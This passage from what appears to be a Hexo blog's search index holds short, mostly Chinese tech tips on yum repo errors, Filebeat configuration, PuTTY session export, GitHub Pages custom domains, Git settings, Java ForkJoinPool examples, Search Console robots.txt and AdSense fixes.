        <tag>Filebeat</tag>
      </tags>
  </entry>
  <entry>
    <title>Errors During Downloading Metadata For Repository Root_</title>
    <url>/posts/1e9495c0/</url>
    <content><![CDATA[<h2 id="Errors-During-Downloading-Metadata-For-Repository-Root"><a href="#Errors-During-Downloading-Metadata-For-Repository-Root" class="headerlink" title="Errors During Downloading Metadata For Repository Root_"></a>Errors During Downloading Metadata For Repository Root_</h2><span id="more"></span>
<p>這篇介紹Errors During Downloading Metadata For Repository Root_。</p>
<h2 id="發生過程"><a href="#發生過程" class="headerlink" title="發生過程:"></a>發生過程:</h2><p>[root@test01 ~]# sudo yum install docker-ce docker-ce-cli containerd.io<br>created by dnf config-manager from file:&#x2F;&#x2F;&#x2F;root&#x2F;<br>Errors during downloading metadata for repository ‘root_’:</p>
<ul>
<li>Curl error (37): Couldn’t read a file:&#x2F;&#x2F; file for file:&#x2F;&#x2F;&#x2F;root&#x2F;repodata&#x2F;repomd.xml [Couldn’t open file &#x2F;root&#x2F;repodata&#x2F;repomd.xml]<br>Error: Failed to download metadata for repo ‘root_’: Cannot download repomd.xml: Cannot download repodata&#x2F;repomd.xml: All mirrors were tried</li>
</ul>
<p>表示有repo文件有問題，必須砍掉原本的重新下載。</p>
<p>$ cd &#x2F;etc&#x2F;yum.repos.d&#x2F;<br>$ rm -rf root_.repo</p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Rocky8</tag>
      </tags>
  </entry>
  <entry>
    <title>Filebeat error loading config file: yaml: did not find expected key</title>
    <url>/posts/25bf0346/</url>
    <content><![CDATA[<h3 id="Intro-How-to-Solve-Filebeat-error-loading-config-file-yaml-did-not-find-expected-key"><a href="#Intro-How-to-Solve-Filebeat-error-loading-config-file-yaml-did-not-find-expected-key" class="headerlink" title="Intro How to Solve Filebeat error loading config file: yaml: did not find expected key"></a>Intro How to Solve Filebeat error loading config file: yaml: did not find expected key</h3><span id="more"></span>
<p>這篇介紹How to Solve Filebeat error loading config file: yaml: did not find expected key。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">啟動filebeat時，process不會出現。用ps -ef |grep filebeat指令檢查</span><br><span class="line">去logs看發現有出現Filebeat error loading config file: yaml: did not find expected key相關error message</span><br><span class="line">造成process不會執行。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">問題出在.yml設定檔可能有出現filebeat不認得的格式或字元</span><br><span class="line">logs通常會指出是哪一個.yml有問題</span><br><span class="line">這邊記錄碰到的問題是編輯yml檔案時，不小心多個一個特殊字元造成parse錯誤</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Filebeat</category>
      </categories>
      <tags>
        <tag>Filebeat</tag>
      </tags>
  </entry>
  <entry>
    <title>Export Import Putty Sessions Setting</title>
    <url>/posts/1e11b320/</url>
    <content><![CDATA[<h3 id="Intro-Export-Import-Putty-Sessions-Setting"><a href="#Intro-Export-Import-Putty-Sessions-Setting" class="headerlink" title="Intro Export Import Putty Sessions Setting"></a>Intro Export Import Putty Sessions Setting</h3><span id="more"></span>
<p>這篇介紹Export Import Putty Sessions Setting。</p>
<h3 id="Export-amp-Import"><a href="#Export-amp-Import" class="headerlink" title="Export &amp; Import"></a>Export &amp; Import</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Export:</span><br><span class="line">開啟命令提示字元視窗</span><br><span class="line">regedit /e <span class="string">&quot;C:\putty-sessions.reg&quot;</span> HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions</span><br><span class="line"></span><br><span class="line">路徑<span class="string">&quot;C:\putty-sessions.reg&quot;</span> 可以自己指定</span><br><span class="line"></span><br><span class="line">Import:</span><br><span class="line">點兩下C:\putty-sessions.reg 檔案即可Import</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Putty</category>
      </categories>
      <tags>
        <tag>Putty</tag>
      </tags>
  </entry>
  <entry>
    <title>Filebeat Pipeline</title>
    <url>/posts/bed5309/</url>
    <content><![CDATA[<h2 id="Filebeat-Pipeline"><a href="#Filebeat-Pipeline" class="headerlink" title="Filebeat Pipeline"></a>Filebeat Pipeline</h2><span id="more"></span>
<p>Filebeat Pipeline 將會介紹 Filebeat Pipeline yml上的設定。</p>
<h2 id="Yml-Important-reminder"><a href="#Yml-Important-reminder" class="headerlink" title="Yml Important reminder:"></a>Yml Important reminder:</h2><ol>
<li>Case sensitive</li>
<li>Use indentation to represent hierarchical relationships</li>
<li>Tabs are not allowed when indenting, only spaces are allowed.</li>
<li>The number of indented spaces is not important,<br>as long as elements of the same level are aligned to the left</li>
</ol>
<h2 id="Sample-pipeline-yml"><a href="#Sample-pipeline-yml" class="headerlink" title="Sample pipeline yml:"></a>Sample pipeline yml:</h2><ul>
<li>type: log<br> paths:</li>
<li>“${PWD}&#x2F;sampleLogs&#x2F;FullRecord.log”<br> fields_under_root: true<br> scan_frequency: 3s<br> idle_timeout: 3s<br> pipeline: fullrecordapi<br> ignore_older: 2h<br> close_inactive: 1h<br> clean_inactive: 3h<br> close_removed: true<br> clean_removed: true<br> processors:</li>
<li>dissect:<br> tokenizer: “[%{logdate}][%{class}][%{severity}][%{thread}]<br>[Status]:%{Status},[Agent_ID]:%{Agent_ID},[Request]:%{Request},[Response]:%{Response}”<br><br> field: “message”<br> target_prefix: “”</li>
<li>drop_event:<br> when:<br> has_fields: [“log.flags”]</li>
</ul>
<h2 id="Paths-in-pipeline-yml"><a href="#Paths-in-pipeline-yml" class="headerlink" title="Paths in pipeline yml:"></a>Paths in pipeline yml:</h2><p>If there are multiple paths in Paths, it is recommended to separate different yml for future<br>debugging and maintenance. The following is an example.</p>
<p>Multiple paths<br>$ vi fullrecordapi.yml</p>
<ul>
<li>type: log<br> paths:</li>
<li>&#x2F;var&#x2F;data&#x2F;log&#x2F;fullrecordapi&#x2F;*.log</li>
<li>&#x2F;var&#x2F;data&#x2F;log1&#x2F;fullrecordapi&#x2F;*.log<br> fields_under_root: true<br> scan_frequency: 3s<br> idle_timeout: 3s<br> pipeline: fullrecordapi</li>
</ul>
<h2 id="Separate-yml"><a href="#Separate-yml" class="headerlink" title="Separate yml:"></a>Separate yml:</h2><p>$ vi fullrecordapi.yml</p>
<ul>
<li>type: log<br> paths:</li>
<li>&#x2F;var&#x2F;data&#x2F;log&#x2F;fullrecordapi&#x2F;*.log<br> fields_under_root: true<br> scan_frequency: 3s<br> idle_timeout: 3s<br> pipeline: fullrecordapi<br>$ vi fullrecordapi1.yml</li>
<li>type: log<br> paths:</li>
<li>&#x2F;var&#x2F;data&#x2F;log1&#x2F;fullrecordapi&#x2F;*.log<br> fields_under_root: true<br> scan_frequency: 3s<br> idle_timeout: 3s<br> pipeline: fullrecordapi</li>
</ul>
]]></content>
      <categories>
        <category>Filebeat</category>
      </categories>
      <tags>
        <tag>Pipeline</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub Pages Add Custom Domain</title>
    <url>/posts/76881ca3/</url>
    <content><![CDATA[<h3 id="Intro-GitHub-Pages-Add-Custom-Domain"><a href="#Intro-GitHub-Pages-Add-Custom-Domain" class="headerlink" title="Intro GitHub Pages Add Custom Domain"></a>Intro GitHub Pages Add Custom Domain</h3><span id="more"></span>
<p>這篇介紹GitHub Pages Add Custom Domain。</p>
<h3 id="Apply-domain"><a href="#Apply-domain" class="headerlink" title="Apply domain"></a>Apply domain</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">需先申請domain</span><br><span class="line">這邊可以申請freenom(免費) or Godaddy(付費)... domain</span><br><span class="line"></span><br><span class="line">這邊會拿到一組domain: abcdefg.com (example)</span><br></pre></td></tr></table></figure>

<h3 id="Setting"><a href="#Setting" class="headerlink" title="Setting"></a>Setting</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">建立 /root/source/CNAME</span><br><span class="line">cmd:</span><br><span class="line">$ <span class="built_in">cd</span> /root/source</span><br><span class="line">$ copy nul CNAME</span><br><span class="line"></span><br><span class="line">編輯 CNAME 加入以下</span><br><span class="line">abcdefg.com</span><br><span class="line"></span><br><span class="line">登入 https://github.com/abcdefg/abcdefg.github.io</span><br><span class="line">Settings -&gt; Pages -&gt; Custom domain -&gt; 填入abcdefg.com</span><br><span class="line"></span><br><span class="line">Enforce HTTPS -&gt; 打勾</span><br></pre></td></tr></table></figure>

<h3 id="在購買domain的網站設定DNS-nameservers"><a href="#在購買domain的網站設定DNS-nameservers" class="headerlink" title="在購買domain的網站設定DNS nameservers"></a>在購買domain的網站設定DNS nameservers</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">先找出GitHub Pages目前的 Server IPs</span><br><span class="line">$ dig abcdefg.github.io</span><br><span class="line"></span><br><span class="line">設定以下五組</span><br><span class="line">abcdefg.com  A  	185.199.108.153</span><br><span class="line">abcdefg.com  A  	185.199.109.153</span><br><span class="line">abcdefg.com  A  	185.199.110.153</span><br><span class="line">abcdefg.com  A  	185.199.111.153</span><br><span class="line">www			 CNAME  abcdefg.com</span><br><span class="line"></span><br><span class="line">設定完需時間生效</span><br><span class="line">$ ping abcdefg.com</span><br><span class="line">$ dig abcdefg.com</span><br><span class="line">可確定DNS是否設定生效及正確</span><br><span class="line"></span><br><span class="line">https://abcdefg.github.io -&gt; 會導至 https://abcdefg.com -&gt; 正確完成</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>domain</tag>
      </tags>
  </entry>
  <entry>
    <title>Git找出目前Branch Name和列出前10筆commit Log</title>
    <url>/posts/607322bd/</url>
    <content><![CDATA[<h3 id="Git找出目前Branch-Name和列出前10筆commit-Log"><a href="#Git找出目前Branch-Name和列出前10筆commit-Log" class="headerlink" title="Git找出目前Branch Name和列出前10筆commit Log"></a>Git找出目前Branch Name和列出前10筆commit Log</h3><span id="more"></span>
<p>這篇介紹Git找出目前Branch Name和列出前10筆commit Log指令。</p>
<h3 id="Branch-Name"><a href="#Branch-Name" class="headerlink" title="Branch Name"></a>Branch Name</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git rev-parse --abbrev-ref HEAD</span><br></pre></td></tr></table></figure>

<h3 id="列出前10筆commit-Log"><a href="#列出前10筆commit-Log" class="headerlink" title="列出前10筆commit Log"></a>列出前10筆commit Log</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> --pretty=format:<span class="string">&#x27;[%h][%an][%ar][%s]&#x27;</span> -10</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Form不顯示在工作列設定</title>
    <url>/posts/86e66913/</url>
    <content><![CDATA[<h3 id="Form不顯示在工作列設定"><a href="#Form不顯示在工作列設定" class="headerlink" title="Form不顯示在工作列設定"></a>Form不顯示在工作列設定</h3><span id="more"></span>
<p>這篇文章介紹如何在將子視窗設定為不顯示在工作列且只能操作一次的設定。</p>
<h3 id="Form屬性"><a href="#Form屬性" class="headerlink" title="Form屬性"></a>Form屬性</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ShowInTaskbar=<span class="literal">false</span></span><br><span class="line">FormBorderStyle=FixedToolWindow</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WinForm</category>
      </categories>
      <tags>
        <tag>showInTaskBar</tag>
      </tags>
  </entry>
  <entry>
    <title>ForkJoinPool Example</title>
    <url>/posts/268c70d8/</url>
    <content><![CDATA[<h3 id="ForkJoinPool-Example"><a href="#ForkJoinPool-Example" class="headerlink" title="ForkJoinPool Example"></a>ForkJoinPool Example</h3><span id="more"></span>
<p>繼上一篇簡單介紹ForkJoinPool與一般的thread有哪些不同的特點，<br>這邊介紹幾個ForkJoinPool的使用範例。</p>
<h3 id="自定義的ForkJoinPool，該範例執行效果等同於Callable的invokeAll"><a href="#自定義的ForkJoinPool，該範例執行效果等同於Callable的invokeAll" class="headerlink" title="自定義的ForkJoinPool，該範例執行效果等同於Callable的invokeAll"></a>自定義的ForkJoinPool，該範例執行效果等同於Callable的invokeAll</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ConcurrentMap&lt;String, String&gt; map1 = new ConcurrentHashMap&lt;&gt;();</span><br><span class="line">ForkJoinPool customThreadPool = new ForkJoinPool(10);</span><br><span class="line"></span><br><span class="line">int[] values1 = customThreadPool.submit(() -&gt; IntStream.range(<span class="number">1</span>, <span class="number">1000000</span>).parallel().filter(x -&gt; &#123;</span><br><span class="line">	map1.put(Thread.currentThread().toString(), String.valueOf(x));</span><br><span class="line">	<span class="built_in">return</span> (x % 2 == 1);</span><br><span class="line">&#125;).toArray()).get();</span><br><span class="line"></span><br><span class="line">System.out.println(map1.keySet());</span><br><span class="line">System.out.println(<span class="string">&quot;thread size:&quot;</span> + map1.keySet().size() + <span class="string">&quot;, array size:&quot;</span> + values1.length);</span><br><span class="line">customThreadPool.shutdown();</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">[Thread[ForkJoinPool-1-worker-10,5,main], Thread[ForkJoinPool-1-worker-15,5,main], Thread[ForkJoinPool-1-worker-11,5,main], Thread[ForkJoinPool-1-worker-8,5,main], Thread[ForkJoinPool-1-worker-2,5,main], Thread[ForkJoinPool-1-worker-9,5,main], Thread[ForkJoinPool-1-worker-4,5,main], Thread[ForkJoinPool-1-worker-1,5,main], Thread[ForkJoinPool-1-worker-6,5,main], Thread[ForkJoinPool-1-worker-13,5,main]]</span><br><span class="line">thread size:10, array size:500000</span><br></pre></td></tr></table></figure>

<h3 id="共用的ForkJoinPool，該範例執行效果等同於Callable的invokeAll"><a href="#共用的ForkJoinPool，該範例執行效果等同於Callable的invokeAll" class="headerlink" title="共用的ForkJoinPool，該範例執行效果等同於Callable的invokeAll"></a>共用的ForkJoinPool，該範例執行效果等同於Callable的invokeAll</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ConcurrentMap&lt;String, String&gt; map2 = new ConcurrentHashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">int[] values2 = IntStream.range(1, 1000000).parallel().filter(x -&gt; &#123;</span><br><span class="line">	map2.put(Thread.currentThread().toString(), String.valueOf(x));</span><br><span class="line">	<span class="built_in">return</span> (x % 2 == 1);</span><br><span class="line">&#125;).toArray();</span><br><span class="line"></span><br><span class="line">System.out.println(map2.keySet());</span><br><span class="line">System.out.println(<span class="string">&quot;thread size:&quot;</span> + map2.keySet().size() + <span class="string">&quot;, array size:&quot;</span> + values2.length);</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">[Thread[ForkJoinPool.commonPool-worker-2,5,main], Thread[main,5,main], Thread[ForkJoinPool.commonPool-worker-1,5,main], Thread[ForkJoinPool.commonPool-worker-3,5,main]]</span><br><span class="line">thread size:4, array size:500000</span><br></pre></td></tr></table></figure>

<h3 id="共用的ForkJoinPool，該範例執行效果等同Runnable的execute"><a href="#共用的ForkJoinPool，該範例執行效果等同Runnable的execute" class="headerlink" title="共用的ForkJoinPool，該範例執行效果等同Runnable的execute"></a>共用的ForkJoinPool，該範例執行效果等同Runnable的execute</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ConcurrentMap&lt;String, String&gt; map3 = new ConcurrentHashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">IntStream.range(1, 1000000).parallel().forEach(x -&gt; &#123;</span><br><span class="line">	map3.put(Thread.currentThread().toString(), String.valueOf(x));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">System.out.println(map3.keySet());</span><br><span class="line">System.out.println(<span class="string">&quot;thread size:&quot;</span> + map3.keySet().size());</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">[Thread[ForkJoinPool.commonPool-worker-2,5,main], Thread[main,5,main], Thread[ForkJoinPool.commonPool-worker-1,5,main], Thread[ForkJoinPool.commonPool-worker-3,5,main]]</span><br><span class="line">thread size:4</span><br></pre></td></tr></table></figure>

<h3 id="自定義的ForkJoinPool，該範例執行執行效果等同Runnable的execute"><a href="#自定義的ForkJoinPool，該範例執行執行效果等同Runnable的execute" class="headerlink" title="自定義的ForkJoinPool，該範例執行執行效果等同Runnable的execute"></a>自定義的ForkJoinPool，該範例執行執行效果等同Runnable的execute</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ForkJoinPool customThreadPool2 = new ForkJoinPool(10);</span><br><span class="line">ConcurrentMap&lt;String, String&gt; map4 = new ConcurrentHashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">customThreadPool2.execute(() -&gt; &#123;</span><br><span class="line">	IntStream.range(<span class="number">1</span>, <span class="number">1000000</span>).parallel().forEach(x -&gt; &#123;</span><br><span class="line">		map4.put(Thread.currentThread().toString(), String.valueOf(x));</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 測試程式過快結束，會導致沒有執行完成，因此等待3秒</span><br><span class="line">Thread.<span class="built_in">sleep</span>(3000);</span><br><span class="line">System.out.println(map4.keySet());</span><br><span class="line">System.out.println(<span class="string">&quot;thread size:&quot;</span> + map4.keySet().size());</span><br><span class="line">customThreadPool2.shutdown();</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">[Thread[ForkJoinPool-1-worker-10,5,main], Thread[ForkJoinPool-1-worker-15,5,main], Thread[ForkJoinPool-1-worker-11,5,main], Thread[ForkJoinPool-1-worker-2,5,main], Thread[ForkJoinPool-1-worker-9,5,main], Thread[ForkJoinPool-1-worker-4,5,main], Thread[ForkJoinPool-1-worker-6,5,main], Thread[ForkJoinPool-1-worker-13,5,main]]</span><br><span class="line">thread size:8</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>ForkJoinPool</tag>
      </tags>
  </entry>
  <entry>
    <title>Git的core.autocrlf與core.safecrlf參數</title>
    <url>/posts/8b6ac390/</url>
    <content><![CDATA[<h3 id="Git的core-autocrlf與core-safecrlf參數"><a href="#Git的core-autocrlf與core-safecrlf參數" class="headerlink" title="Git的core.autocrlf與core.safecrlf參數"></a>Git的core.autocrlf與core.safecrlf參數</h3><span id="more"></span>
<p>在換行的世界，windows是CRLF( \r\n ) ( 0x0D 0x0A )，Linux是LF (\n ) ( 0x0A )。</p>
<h3 id="Git上設定-core-autocrlf-x3D-true"><a href="#Git上設定-core-autocrlf-x3D-true" class="headerlink" title="Git上設定 core.autocrlf &#x3D; true"></a>Git上設定 core.autocrlf &#x3D; true</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">作用是 commit 時會自動將 CRLF 轉成 LF ； checkout 時會自動將 LF 轉成 CRLF</span><br><span class="line"></span><br><span class="line">$ git config --global core.autocrlf <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="Git上設定-core-autocrlf-x3D-input"><a href="#Git上設定-core-autocrlf-x3D-input" class="headerlink" title="Git上設定 core.autocrlf &#x3D; input"></a>Git上設定 core.autocrlf &#x3D; input</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">作用是 commit 時會自動將 CRLF 轉成 LF ； checkout 時不轉換</span><br><span class="line"></span><br><span class="line">$ git config --global core.autocrlf input</span><br></pre></td></tr></table></figure>

<h3 id="Git上設定-core-autocrlf-x3D-false"><a href="#Git上設定-core-autocrlf-x3D-false" class="headerlink" title="Git上設定 core.autocrlf &#x3D; false"></a>Git上設定 core.autocrlf &#x3D; false</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">作用是 停止自動轉換，不管 commit 或是 checkout 都不會進行轉換</span><br><span class="line"></span><br><span class="line">$ git config --global core.autocrlf <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="不允許-有-LF-與-CRLF-混合的檔案"><a href="#不允許-有-LF-與-CRLF-混合的檔案" class="headerlink" title="不允許 有 LF 與 CRLF 混合的檔案"></a>不允許 有 LF 與 CRLF 混合的檔案</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global core.safecrlf <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="允許-有-LF-與-CRLF-混合的檔案"><a href="#允許-有-LF-與-CRLF-混合的檔案" class="headerlink" title="允許 有 LF 與 CRLF 混合的檔案"></a>允許 有 LF 與 CRLF 混合的檔案</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global core.safecrlf <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="允許-有-LF-與-CRLF-混合的檔案，但是會出現-warning-警告訊息"><a href="#允許-有-LF-與-CRLF-混合的檔案，但是會出現-warning-警告訊息" class="headerlink" title="允許 有 LF 與 CRLF 混合的檔案，但是會出現 warning 警告訊息"></a>允許 有 LF 與 CRLF 混合的檔案，但是會出現 warning 警告訊息</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global core.safecrlf warn</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>GoogleDrive轉移資料至另一個GoogleDrive using MultCloud</title>
    <url>/posts/837705c0/</url>
    <content><![CDATA[<h3 id="GoogleDrive轉移資料至另一個GoogleDrive"><a href="#GoogleDrive轉移資料至另一個GoogleDrive" class="headerlink" title="GoogleDrive轉移資料至另一個GoogleDrive"></a>GoogleDrive轉移資料至另一個GoogleDrive</h3><span id="more"></span>
<p>這邊介紹一個網頁服務叫MultCloud，可以註冊免費用戶(每個月有50GB的免費使用量)，MultCloud支援17種雲端硬碟的資料轉移，訂閱用戶每個月能有150GB的資料使用量</p>
<p>透過MultCloud能將Google Drive 的資料轉移至另一個Google Drive，非常方便。</p>
]]></content>
      <categories>
        <category>Google Drive</category>
      </categories>
      <tags>
        <tag>Google Drive</tag>
        <tag>MultCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>Git設定Tip</title>
    <url>/posts/e1c3f593/</url>
    <content><![CDATA[<h3 id="Git設定Tip"><a href="#Git設定Tip" class="headerlink" title="Git設定Tip"></a>Git設定Tip</h3><span id="more"></span>
<p>這篇將介紹幾個Git設定上的Tip~</p>
<p>將rebase當做pull的預設值</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global pull.rebase <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">目的:避免pull時產生多餘的merge，造成歷程線圖複雜</span><br></pre></td></tr></table></figure>

<p>將no-fast-foward當作merge的預設值</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global merge.ff no</span><br><span class="line"></span><br><span class="line">目的:強制merge時產生新的commit，維持原本分支歷程的線圖</span><br></pre></td></tr></table></figure>

<p>將prune設為fetch的預設值</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global fetch.prune <span class="literal">true</span></span><br><span class="line">$ git config --global fetch.pruneTags <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">目的:移除遠端已經被刪除的branch/tag在本地端的參考</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>GoPro7時間設定問題</title>
    <url>/posts/1a575eb0/</url>
    <content><![CDATA[<h3 id="GoPro7時間設定問題"><a href="#GoPro7時間設定問題" class="headerlink" title="GoPro7時間設定問題"></a>GoPro7時間設定問題</h3><span id="more"></span>
<p>寫信向忠欣反應GoPro7拍照或錄影的檔案時間格式會初始化為2016&#x2F;01&#x2F;01，提供序號及聯絡方式後，技術客服來電表示GoPro從第三代開始就有此問題。</p>
<p>因為GoPro本體本身不含任何電池，所以沒辦法對時校正，客服表示送修換一台也可能會存在此問題，目前這是一個無解的BUG。只能每次開機自行設定時間及</p>
<p>編輯照片或影片時在編輯上正確時間。</p>
]]></content>
      <categories>
        <category>GoPro7</category>
      </categories>
      <tags>
        <tag>GoPro7</tag>
      </tags>
  </entry>
  <entry>
    <title>Google Search Console 修復行動裝置可用性</title>
    <url>/posts/ebf24060/</url>
    <content><![CDATA[<h3 id="Google-Search-Console-修復行動裝置可用性"><a href="#Google-Search-Console-修復行動裝置可用性" class="headerlink" title="Google Search Console 修復行動裝置可用性"></a>Google Search Console 修復行動裝置可用性</h3><span id="more"></span>
<p>這篇介紹Google Search Console 修復行動裝置可用性。</p>
<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">可點選的元素之間距離太近</span><br><span class="line">文字太小，不易閱讀</span><br><span class="line"></span><br><span class="line">在Google Search Console後台預覽網站會發生沒有吃到css樣式</span><br><span class="line">以致GoogleBot判斷網站瀏覽有問題</span><br></pre></td></tr></table></figure>

<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">將</span><br><span class="line">Disallow: /js/</span><br><span class="line">Disallow: /css/</span><br><span class="line">變更為</span><br><span class="line">Allow: /js/</span><br><span class="line">Allow: /css/</span><br><span class="line"></span><br><span class="line">重新提交驗證，等GoogleBot再次檢索。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>GoogleSearchConsole</category>
      </categories>
      <tags>
        <tag>GoogleSearchConsole</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Google Adsense Tag Error</title>
    <url>/posts/9cf5b451/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Google-Adsense-Tag-Error"><a href="#How-To-Solve-Google-Adsense-Tag-Error" class="headerlink" title="How To Solve Google Adsense Tag Error"></a>How To Solve Google Adsense Tag Error</h3><span id="more"></span>
<p>這篇介紹How To Solve Google Adsense Error “TagError: adsbygoogle.push() error: No slot size for availableWidth&#x3D;0 “.</p>
<h3 id="解決上一篇push-error後，瀏覽器F12會出現TagError-Message"><a href="#解決上一篇push-error後，瀏覽器F12會出現TagError-Message" class="headerlink" title="解決上一篇push error後，瀏覽器F12會出現TagError Message"></a>解決上一篇push error後，瀏覽器F12會出現TagError Message</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">TagError Message:</span><br><span class="line">Google Adsense Error <span class="string">&quot;TagError: adsbygoogle.push() error: No slot size for availableWidth=0 &quot;</span>.</span><br><span class="line"></span><br><span class="line">原因是</span><br><span class="line">當資源還沒加載完成就被引用adsbygoogle.push()</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">若是Hexo 8 version，請將 <span class="built_in">source</span>/_date下的 .njk裡面的</span><br><span class="line"></span><br><span class="line">(adsbygoogle = window.adsbygoogle || []).push(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">改成</span><br><span class="line"></span><br><span class="line">window.onload = <span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">    (adsbygoogle = window.adsbygoogle || []).push(&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>GoogleAdsense</category>
      </categories>
      <tags>
        <tag>GoogleAdsense</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP Request Warning Invalid Cookie Header</title>
    <url>/posts/8bab03c8/</url>
    <content><![CDATA[<h3 id="HTTPRequestWarning-InvalidCookieHeader"><a href="#HTTPRequestWarning-InvalidCookieHeader" class="headerlink" title="HTTPRequestWarning-InvalidCookieHeader"></a>HTTPRequestWarning-InvalidCookieHeader</h3><span id="more"></span>
<p>Java上每個Request請求皆出現此訊息:<br>May 13, 2020 3:12:04 PM org.apache.http.client.protocol.ResponseProcessCookies processCookies<br>WARNING: Invalid cookie header: “Set-Cookie: xxx; expires&#x3D;Wed, 12 May 2021 10:48:23 GMT;<br>HttpOnly; path&#x3D;&#x2F;; Domain&#x3D;.xxx.net”. Invalid ‘expires’ attribute: Wed, 12 May 2021 10:48:23 GMT</p>
<h3 id="org-apache-http-client-protocol-ResponseProcessCookies-processCookies"><a href="#org-apache-http-client-protocol-ResponseProcessCookies-processCookies" class="headerlink" title="org.apache.http.client.protocol.ResponseProcessCookies processCookies"></a>org.apache.http.client.protocol.ResponseProcessCookies processCookies</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">解析cookie的expires屬性導致解析異常，從而導致HttpContent無法解析出正確的cookie。</span><br><span class="line">可以看到返回的Response cookie與期望解析的格式不一致。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">HttpClient httpClient = HttpClients.custom().setDefaultRequestConfig(RequestConfig.custom().setCookieSpec(CookieSpecs.STANDARD).build()).build();</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo NextT Enhance Performance</title>
    <url>/posts/6ac359d/</url>
    <content><![CDATA[<h3 id="Hexo-NextT-Enhance-Performance"><a href="#Hexo-NextT-Enhance-Performance" class="headerlink" title="Hexo NextT Enhance Performance"></a>Hexo NextT Enhance Performance</h3><span id="more"></span>
<p>這篇介紹How to enhance Hexo NextT Performance。</p>
